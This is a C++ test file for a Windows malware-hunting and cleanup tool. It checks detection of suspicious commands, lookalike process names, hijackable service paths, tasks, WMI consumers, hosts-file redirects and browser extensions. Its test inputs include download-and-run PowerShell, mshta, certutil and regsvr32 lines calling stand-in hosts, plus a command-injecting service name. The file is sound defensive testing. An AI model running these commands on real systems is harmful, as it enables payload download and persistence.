// DD Cleaner
// © Benoit Saint-Moulin - 2026
// Version du fichier : 1.0.0
// Fonction du fichier : Tests the malware hunt: command patterns, file judging, services, tasks, WMI, hosts file and browser extensions.

#include <cmath>
#include <cstdio>

#include <windows.h>

#include <ddcore/registry.hpp>
#include <ddcore/threat.hpp>

using namespace dd;

static int failures = 0, checks = 0;

#define CHECK(cond)                                                                \
    do {                                                                           \
        ++checks;                                                                  \
        if (!(cond)) {                                                             \
            ++failures;                                                            \
            std::fprintf(stderr, "FAILED %s:%d  %s\n", __FILE__, __LINE__, #cond); \
        }                                                                          \
    } while (0)

struct RatioCase {
    const wchar_t *a, *b;
    double ratio;
};
static const RatioCase RATIOS[] = {
#include "ratio_cases.inc"
};

static bool has_flag(const HuntFinding& f, const std::wstring& part) {
    for (const auto& x : f.flags) {
        if (x.find(part) != std::wstring::npos) return true;
    }
    return false;
}

static std::wstring work_dir() {
    // a folder that is neither a temp nor a download folder: next to the executable
    std::wstring dir = join(exe_dir(), L"hunt_test_" + std::to_wstring(GetCurrentProcessId()));
    make_dirs(dir);
    return dir;
}

static void fake_exe(const std::wstring& path) {
    make_dirs(dir_name(path));
    write_file(path, std::string("MZ") + std::string(200, 'x'));
}

static FileJudge judge_with(bool signed_files, bool packed, bool writable) {
    return FileJudge([=](const std::wstring&) { return signed_files ? L"Trusted Corp" : L""; },
                     [=](const std::wstring&) { return packed; }, [=](const std::wstring&) { return writable; });
}

static void test_patterns_and_places() {
    auto hits = [](const wchar_t* cmd) { return suspicious_command(cmd); };
    CHECK(hits(L"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA").size() >= 2);
    CHECK(hits(L"cmd /c iex (New-Object Net.WebClient).DownloadString('http://x/a.ps1')")[0].second == SEV_SUSPICIOUS);
    CHECK(hits(L"mshta http://evil.example/payload.hta").size() >= 1);
    CHECK(hits(L"certutil -urlcache -f http://x/a.exe a.exe").size() >= 2);
    CHECK(hits(L"regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll").size() >= 2);
    auto hidden = hits(L"powershell.exe -WindowStyle Hidden -File C:\\x\\a.ps1");
    CHECK(hidden.size() == 1 && hidden[0].second == SEV_LOOK && hidden[0].first == L"hidden window");
    CHECK(hits(L"\"C:\\Program Files\\App\\app.exe\" --silent").empty());
    CHECK(hits(L"").empty());
    CHECK(hits(L"C:\\tools\\diexe.exe -x").empty());   // "iex" only counts as a whole word

    CHECK(!risky_location(L"C:\\Users\\me\\Downloads\\a.exe").empty());
    CHECK(!risky_location(L"C:\\Users\\Public\\a.exe").empty());
    CHECK(!risky_location(L"C:\\Windows\\Temp\\a.exe").empty());
    CHECK(!risky_location(join(temp_dir(), L"a.exe")).empty());
    CHECK(risky_location(L"C:\\Program Files\\App\\a.exe").empty() && risky_location(L"").empty());
    CHECK(judge_in_windows(L"C:\\WINDOWS\\system32\\x.dll") && !judge_in_windows(L"C:\\Program Files\\x.dll") && !judge_in_windows(L"C:\\WindowsX\\x.dll"));

    auto planted = hijackable_prefixes(L"C:\\Program Files\\My App\\svc.exe -k run");
    CHECK(planted.size() == 1 && planted[0] == L"C:\\Program Files\\My.exe");
    CHECK(hijackable_prefixes(L"\"C:\\Program Files\\My App\\svc.exe\"").empty());   // quoted: safe
    CHECK(hijackable_prefixes(L"C:\\Tools\\svc.exe").empty());                        // no space on the way
    CHECK(hijackable_prefixes(L"svc.exe").empty() && hijackable_prefixes(L"").empty());
}

static void test_similarity() {
    for (const RatioCase& c : RATIOS) {
        double got = sequence_ratio(c.a, c.b);
        if (std::fabs(got - c.ratio) > 1e-9) std::fprintf(stderr, "  ratio mismatch %ls / %ls: %.6f vs %.6f\n", c.a, c.b, got, c.ratio);
        CHECK(std::fabs(got - c.ratio) < 1e-9);
    }
    CHECK(lookalike(L"svch0st.exe") == L"svchost.exe" && lookalike(L"explorer32.exe") == L"explorer.exe");
    CHECK(lookalike(L"taskhostx.exe") == L"taskhostw.exe" && lookalike(L"runtimebrokr.exe") == L"runtimebroker.exe");
    CHECK(lookalike(L"searchlndexer.exe") == L"searchindexer.exe" && lookalike(L"fontdrvhots.exe") == L"fontdrvhost.exe");
    CHECK(lookalike(L"dllhosts.exe") == L"dllhost.exe" && lookalike(L"taskmgrr.exe") == L"taskmgr.exe");
    CHECK(lookalike(L"sihost.exe").empty() && lookalike(L"chrome.exe").empty());   // short names and unrelated names
    CHECK(lookalike(L"svchost.exe").empty());                                       // the real one is not a copy
}

static void test_judge_and_flags() {
    std::wstring dir = work_dir();
    std::wstring prog = join(dir, L"app.exe");
    fake_exe(prog);
    FileJudge unsigned_judge = judge_with(false, false, false);
    CHECK(unsigned_judge.unsigned_file(prog) && unsigned_judge.signer(prog).empty());
    CHECK(!unsigned_judge.unsigned_file(join(system32(), L"cmd.exe")));   // Windows files are signed by catalog: not judged
    fake_exe(join(dir, L"notes.txt"));
    CHECK(!unsigned_judge.unsigned_file(join(dir, L"notes.txt")));        // not a program file
    FileJudge signed_judge = judge_with(true, false, false);
    CHECK(!signed_judge.unsigned_file(prog) && signed_judge.signer(prog) == L"Trusted Corp");

    auto plain = program_flags(prog, signed_judge, false);
    CHECK(plain.first.empty() && plain.second == SEV_INFO);
    auto unsigned_flags = program_flags(prog, unsigned_judge, false);
    CHECK(unsigned_flags.first.size() == 1 && unsigned_flags.first[0] == L"Not signed" && unsigned_flags.second == SEV_LOOK);
    FileJudge packed_judge = judge_with(false, true, false);
    auto packed_flags = program_flags(prog, packed_judge, false);
    CHECK(packed_flags.first.size() == 2 && packed_flags.second == SEV_SUSPICIOUS);
    FileJudge writable_judge = judge_with(true, false, true);
    auto elevated = program_flags(prog, writable_judge, true);
    CHECK(elevated.second == SEV_SUSPICIOUS && elevated.first[0] == L"Its folder can be changed by standard users");
    CHECK(program_flags(prog, writable_judge, false).first.empty());   // only matters when it runs with high rights
    auto risky = program_flags(L"C:\\Users\\me\\Downloads\\x.exe", signed_judge, false);
    CHECK(risky.second == SEV_SUSPICIOUS);

    // judged once: the signer function is not called twice for the same file
    int calls = 0;
    FileJudge counting([&](const std::wstring&) { ++calls; return std::wstring(); }, nullptr, nullptr);
    counting.signer(prog);
    counting.signer(prog);
    counting.signer(prog);
    CHECK(calls == 1);

    delete_file(prog);
    delete_file(join(dir, L"notes.txt"));
    RemoveDirectoryW(dir.c_str());
}

static void test_services() {
    std::wstring dir = work_dir();
    std::wstring prog = join(dir, L"svc.exe");
    fake_exe(prog);
    FileJudge judge = judge_with(false, false, true);
    std::vector<ServiceEntry> services = {
        {L"Unsigned", L"Unsigned service", L"\"" + prog + L"\" -run", true, 2, L"LocalSystem", L""},
        {L"Disabled", L"Disabled one", L"\"" + prog + L"\"", true, 4, L"LocalSystem", L""},
        {L"WindowsOne", L"Windows service", join(system32(), L"svchost.exe") + L" -k netsvcs", true, 2, L"LocalSystem", L""},
        {L"Gone", L"Gone service", L"C:\\definitely\\not\\here\\gone.exe", true, 2, L"LocalSystem", L""},
        {L"GoneManual", L"Gone manual", L"C:\\definitely\\not\\here\\gone.exe", true, 3, L"LocalSystem", L""},
        {L"Encoded", L"Encoded", L"\"" + prog + L"\" -enc AAAAAAAAAAAAAAAAAAAAAAAA", true, 2, L"LocalSystem", L""},
        {L"NoStart", L"No start value", L"\"" + prog + L"\"", false, -1, L"LocalSystem", L""},
    };
    auto found = check_services(services, judge);
    auto by_name = [&](const wchar_t* title) -> const HuntFinding* {
        for (const auto& f : found) {
            if (f.title == title) return &f;
        }
        return nullptr;
    };
    const HuntFinding* u = by_name(L"Unsigned service");
    CHECK(u && u->severity == SEV_SUSPICIOUS && has_flag(*u, L"Not signed") && has_flag(*u, L"folder can be changed"));   // LocalSystem + writable folder
    CHECK(u && u->path == prog && u->removal.kind == L"service" && u->removal.args[0] == L"Unsigned");
    CHECK(u && u->location == L"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Unsigned");
    CHECK(by_name(L"Disabled one") == nullptr && by_name(L"Windows service") == nullptr && by_name(L"No start value") == nullptr);
    const HuntFinding* g = by_name(L"Gone service");
    CHECK(g && g->severity == SEV_LOOK && g->dead() && has_flag(*g, L"Automatic service whose program is missing"));
    CHECK(by_name(L"Gone manual") == nullptr);   // only automatic services are reported as missing
    const HuntFinding* e = by_name(L"Encoded");
    CHECK(e && e->severity == SEV_SUSPICIOUS && has_flag(*e, L"encoded PowerShell command"));

    // an unquoted path with spaces and a writable folder on the way
    std::wstring spaced = join(join(dir, L"My Folder"), L"svc.exe");
    fake_exe(spaced);
    FileJudge writable = judge_with(true, false, true);
    std::vector<ServiceEntry> hijack = {{L"Spaced", L"Spaced", spaced + L" -k", true, 2, L"LocalSystem", L""}};
    auto spaced_found = check_services(hijack, writable);
    CHECK(spaced_found.size() == 1 && has_flag(spaced_found[0], L"can be hijacked") && spaced_found[0].severity == SEV_SUSPICIOUS);
    FileJudge protected_folder = judge_with(true, false, false);
    CHECK(check_services(hijack, protected_folder).empty());

    Stop stop_now = [] { return true; };
    CHECK(check_services(services, judge, stop_now).empty());
    delete_file(prog);
    delete_file(spaced);
    RemoveDirectoryW(dir_name(spaced).c_str());
    RemoveDirectoryW(dir.c_str());
}

static void test_tasks_and_wmi() {
    std::wstring dir = work_dir();
    std::wstring prog = join(dir, L"task.exe");
    fake_exe(prog);
    FileJudge judge = judge_with(false, false, false);
    auto task = [](const std::wstring& name, const std::wstring& path, const std::wstring& exec, const std::wstring& args, const std::wstring& user,
                   const std::wstring& level) {
        Json t = Json::object();
        t.set(L"Name", Json::string(name));
        t.set(L"Path", Json::string(path));
        t.set(L"Exec", Json::string(exec));
        t.set(L"Args", Json::string(args));
        t.set(L"User", Json::string(user));
        t.set(L"Level", Json::string(level));
        return t;
    };
    Json list = Json::array();
    list.push(task(L"Updater", L"\\Acme\\", prog, L"/quiet", L"SYSTEM", L"Highest"));
    list.push(task(L"Missing", L"\\", L"C:\\definitely\\not\\here\\a.exe", L"", L"me", L"Limited"));
    list.push(task(L"Download", L"\\", L"powershell.exe", L"-nop -w hidden iex (iwr http://x/a)", L"me", L"Limited"));
    list.push(task(L"NoAction", L"\\", L"", L"", L"me", L"Limited"));
    auto found = check_tasks(judge, &list);
    auto by_name = [&](const wchar_t* n) -> const HuntFinding* {
        for (const auto& f : found) {
            if (f.title == n) return &f;
        }
        return nullptr;
    };
    const HuntFinding* updater = by_name(L"Updater");
    CHECK(updater && has_flag(*updater, L"Not signed") && updater->severity == SEV_LOOK);
    CHECK(updater && updater->location == L"Task Scheduler \\Acme\\ as SYSTEM (highest privileges)");
    CHECK(updater && updater->removal.kind == L"task" && updater->removal.args[0] == L"Updater" && updater->removal.args[1] == L"\\Acme\\");
    const HuntFinding* missing = by_name(L"Missing");
    CHECK(missing && missing->dead() && has_flag(*missing, L"Program not found") && missing->severity == SEV_LOOK);
    const HuntFinding* download = by_name(L"Download");
    CHECK(download && download->severity == SEV_SUSPICIOUS && has_flag(*download, L"hidden window"));
    CHECK(by_name(L"NoAction") == nullptr);
    CHECK(check_tasks(judge, nullptr, never).size() >= 0);   // the real PowerShell call must simply work

    Json consumers = parse_json(LR"J([{"Kind":"CommandLineEventConsumer","Name":"Persist","Cmd":"cmd /c evil.bat","Exe":"","Script":""},
        {"Kind":"ActiveScriptEventConsumer","Name":"","Cmd":"","Exe":"","Script":"WScript.Echo 'x'"},
        {"Kind":"LogFileEventConsumer","Name":"Logger","Cmd":"","Exe":"C:\\log.exe","Script":""},
        {"Kind":"NTEventLogEventConsumer","Name":"SCM Event Log Consumer"}])J");
    auto wmi = check_wmi(&consumers);
    CHECK(wmi.size() == 3);
    CHECK(wmi[0].severity == SEV_SUSPICIOUS && wmi[0].detail == L"cmd /c evil.bat" && wmi[1].title == L"ActiveScriptEventConsumer" && wmi[1].detail == L"WScript.Echo 'x'");
    CHECK(wmi[2].severity == SEV_LOOK && wmi[2].detail == L"C:\\log.exe" && wmi[2].location == L"root\\subscription (LogFileEventConsumer)");
    delete_file(prog);
    RemoveDirectoryW(dir.c_str());
}

static void test_hosts_and_extensions() {
    std::wstring dir = work_dir();
    std::wstring hosts = join(dir, L"hosts");
    write_file(hosts,
               "# comment\r\n127.0.0.1 localhost\r\n::1 localhost\r\n127.0.0.1 virustotal.com # blocked\r\n0.0.0.0 update.microsoft.com windowsupdate.com\r\n"
               "10.1.2.3 login.example-bank.com\r\n10.1.2.4 intranet.local\r\n::2 skipped.example\r\n   \r\nbadline\r\n");
    auto found = check_hosts(hosts);
    CHECK(found.size() == 5);
    CHECK(found[0].title == L"virustotal.com" && found[0].severity == SEV_SUSPICIOUS && found[0].location == hosts + L", line 4");
    CHECK(found[1].title == L"update.microsoft.com" && found[2].title == L"windowsupdate.com");
    CHECK(found[3].title == L"login.example-bank.com" && found[3].severity == SEV_SUSPICIOUS && found[3].flags[0] == L"Sends login.example-bank.com to 10.1.2.3");
    CHECK(found[4].title == L"intranet.local" && found[4].severity == SEV_LOOK);
    CHECK(check_hosts(join(dir, L"no-such-file")).empty());
    delete_file(hosts);

    // Chromium extensions in a fake LocalAppData
    std::wstring app = join(dir, L"LocalAppData");
    std::wstring ext_root = join(app, L"Google\\Chrome\\User Data\\Default\\Extensions");
    std::wstring greedy = join(ext_root, L"aaaaaaaaaaaaaaaa\\2.0");
    std::wstring old_version = join(ext_root, L"aaaaaaaaaaaaaaaa\\1.0");
    std::wstring quiet = join(ext_root, L"bbbbbbbbbbbbbbbb\\1.0");
    for (const auto& d : {greedy, old_version, quiet, join(quiet, L"_locales\\en")}) make_dirs(d);
    write_file(join(greedy, L"manifest.json"), "\xEF\xBB\xBF{\"name\":\"Greedy\",\"version\":\"2.0\",\"permissions\":[\"cookies\",\"history\",\"storage\"],\"host_permissions\":[\"<all_urls>\"]}");
    write_file(join(old_version, L"manifest.json"), "{\"name\":\"Old version\",\"version\":\"1.0\"}");
    write_file(join(quiet, L"manifest.json"), "{\"name\":\"__MSG_appName__\",\"version\":\"1.0\",\"default_locale\":\"en\",\"permissions\":[\"storage\"],\"content_scripts\":[{\"matches\":[\"https://example.com/*\"]}]}");
    write_file(join(quiet, L"_locales\\en\\messages.json"), "{\"appName\":{\"message\":\"Quiet Helper\"}}");
    auto ext = check_extensions(app);
    CHECK(ext.size() == 2);
    CHECK(ext[0].title == L"Greedy" && ext[0].severity == SEV_LOOK && has_flag(ext[0], L"Reads every site and can use: cookies, history"));
    CHECK(ext[0].detail == L"Chrome (Default), version 2.0, id aaaaaaaaaaaaaaaa");
    CHECK(ext[1].title == L"Quiet Helper" && ext[1].severity == SEV_INFO && ext[1].flags.empty());
    for (const auto& f : {join(greedy, L"manifest.json"), join(old_version, L"manifest.json"), join(quiet, L"manifest.json"), join(quiet, L"_locales\\en\\messages.json")}) delete_file(f);
    for (const auto& d : {greedy, old_version, join(ext_root, L"aaaaaaaaaaaaaaaa"), join(quiet, L"_locales\\en"), join(quiet, L"_locales"), quiet, join(ext_root, L"bbbbbbbbbbbbbbbb"),
                          ext_root, join(app, L"Google\\Chrome\\User Data\\Default"), join(app, L"Google\\Chrome\\User Data"), join(app, L"Google\\Chrome"), join(app, L"Google"), app})
        RemoveDirectoryW(d.c_str());
    RemoveDirectoryW(dir.c_str());
}

static void test_processes() {
    FileJudge judge = judge_with(false, false, false);
    std::wstring dir = work_dir();
    std::wstring prog = join(dir, L"tool.exe");
    fake_exe(prog);
    auto honest = judge_process(500, L"Tool.exe", prog, 0, judge);
    CHECK(honest.severity == SEV_LOOK && honest.flags == std::vector<std::wstring>{L"Not signed"});
    auto talking = judge_process(500, L"tool.exe", prog, 3, judge);
    CHECK(talking.severity == SEV_SUSPICIOUS && talking.flags.back() == L"Unsigned and connected to the Internet (3)");
    auto fake_system = judge_process(501, L"svchost.exe", prog, 0, judge);
    CHECK(fake_system.severity == SEV_SUSPICIOUS && fake_system.flags[0] == L"Named like a Windows program but not in the Windows folder");
    auto real_system = judge_process(502, L"svchost.exe", join(system32(), L"svchost.exe"), 0, judge);
    CHECK(real_system.severity == SEV_INFO && real_system.flags.empty());
    auto imitation = judge_process(503, L"svch0st.exe", prog, 0, judge);
    CHECK(imitation.severity == SEV_SUSPICIOUS && imitation.flags[0] == L"Name looks like svchost.exe");
    auto vanished = judge_process(504, L"ghost.exe", join(dir, L"ghost.exe"), 0, judge);
    CHECK(vanished.severity == SEV_SUSPICIOUS && vanished.flags[0] == L"Program file no longer exists on disk");
    auto downloaded = judge_process(505, L"dl.exe", L"C:\\Users\\me\\Downloads\\dl.exe", 0, judge);
    CHECK(downloaded.severity == SEV_SUSPICIOUS);   // the file does not exist there either; both reasons are fine
    auto hidden = judge_process(506, L"secret.exe", L"", 0, judge);
    CHECK(hidden.severity == SEV_INFO && hidden.flags[0] == L"Program path hidden (protected or access denied)");
    auto allowed = judge_process(507, L"Registry", L"", 0, judge);
    CHECK(allowed.flags.empty());

    std::vector<HuntFinding> persistence(1);
    persistence[0].path = prog;
    std::vector<ProcessFinding> processes(2);
    processes[0].path = join(system32(), L"cmd.exe");
    processes[1].path = L"C:\\no\\such.exe";
    auto paths = program_paths(persistence, processes);
    CHECK(paths.size() == 2 && lower(paths[0]) < lower(paths[1]));   // existing files only, sorted
    delete_file(prog);
    RemoveDirectoryW(dir.c_str());
}

static void test_removal() {
    std::wstring folder = work_dir();
    const std::wstring key = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run";
    std::wstring name = L"DDCoreTest" + std::to_wstring(GetCurrentProcessId());
    HKEY k = nullptr;
    // some systems refuse a standard user the Policies keys: then the value is "already gone" and nothing needs a backup
    bool created = RegCreateKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, nullptr, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, nullptr, &k, nullptr) == ERROR_SUCCESS && k;
    if (k) {
        RegSetValueExW(k, name.c_str(), 0, REG_SZ, (const BYTE*)L"C:\\x.exe", 18);
        RegCloseKey(k);
    }
    HuntFinding policy;
    policy.removal = {L"regvalue", {L"HKCU", key, name}};
    HuntFinding not_allowed;
    not_allowed.removal = {L"regvalue", {L"HKCU", L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", name}};   // not one of the places the hunt knows
    HuntFinding hijacked_hive;
    hijacked_hive.removal = {L"regvalue", {L"HKCR", key, name}};
    HuntFinding service;
    service.removal = {L"service", {L"Beep"}};
    HuntFinding windows_service;
    windows_service.path = join(system32(), L"drivers\\beep.sys");
    windows_service.removal = {L"service", {L"Beep"}};
    HuntFinding bad_name;
    bad_name.removal = {L"service", {L"x & del *"}};
    HuntFinding nothing;
    CHECK(removable(policy) && removable(service) && !removable(nothing));
    CHECK(describe(policy).find(L"Delete the value " + name) == 0 && describe(service) == L"Delete the service Beep (its registry key is saved first)");

    std::vector<std::wstring> deleted;
    auto fake_sc = [&](const std::wstring& n) {
        deleted.push_back(n);
        return 1072;   // marked for deletion: needs a restart
    };
    HuntRemovalResult r = remove_findings({policy, not_allowed, hijacked_hive, service, windows_service, bad_name, nothing}, folder, never, fake_sc);
    CHECK(r.removed.size() == 2);                                   // the policy value and the service
    CHECK(r.failed.size() == 5);
    CHECK(r.reboot && deleted.size() == 1 && deleted[0] == L"Beep");   // never asked to delete the others
    bool value_gone = true;
    for (const auto& v : RegKey::open(L"HKCU", key).values()) value_gone &= v.name != name;
    CHECK(value_gone);
    int reg_backups = 0;
    for (const auto& b : r.backups) {
        reg_backups += ends_with(b, L".reg") && is_file(b);
    }
    if (reg_backups != (created ? 2 : 1)) {
        for (const auto& b : r.backups) std::fprintf(stderr, "  backup: %ls exists=%d\n", b.c_str(), (int)is_file(b));
    }
    CHECK(reg_backups == (created ? 2 : 1));                                          // both were saved before anything was removed
    for (const auto& [f, why] : r.failed) CHECK(!why.empty());

    // a task or service can never be removed after a failed backup
    HuntFinding unsaved;
    unsaved.removal = {L"service", {L"DefinitelyNoSuchServiceForDDCore"}};
    deleted.clear();
    HuntRemovalResult failed = remove_findings({unsaved}, folder, never, fake_sc);
    CHECK(failed.removed.empty() && deleted.empty() && failed.failed.size() == 1);

    if (created) RegDeleteKeyExW(HKEY_CURRENT_USER, key.c_str(), KEY_WOW64_64KEY, 0);   // only removes the key if it is empty again
    for (const auto& b : r.backups) delete_file(b);
    RemoveDirectoryW(folder.c_str());
}

static void test_real_machine() {
    FileJudge judge;
    auto persistence = collect_persistence(never, nullptr, &judge);
    auto processes = scan_processes(never, nullptr, &judge);
    int sus_p = 0, look_p = 0, sus_f = 0, look_f = 0;
    for (const auto& f : persistence) {
        sus_f += f.severity == SEV_SUSPICIOUS;
        look_f += f.severity == SEV_LOOK;
    }
    for (const auto& p : processes) {
        sus_p += p.severity == SEV_SUSPICIOUS;
        look_p += p.severity == SEV_LOOK;
    }
    for (std::size_t i = 1; i < persistence.size(); ++i) CHECK(persistence[i - 1].severity >= persistence[i].severity);   // most severe first
    CHECK(!processes.empty());
    std::printf("  machine: %zu persistence findings (%d suspicious, %d to look at), %zu processes (%d suspicious, %d to look at)\n", persistence.size(), sus_f,
                look_f, processes.size(), sus_p, look_p);
}

int run_hunt_tests() {
    test_patterns_and_places();
    test_similarity();
    test_judge_and_flags();
    test_services();
    test_tasks_and_wmi();
    test_hosts_and_extensions();
    test_processes();
    test_removal();
    test_real_machine();
    std::printf("hunt: %d checks, %d failed\n", checks, failures);
    return failures;
}
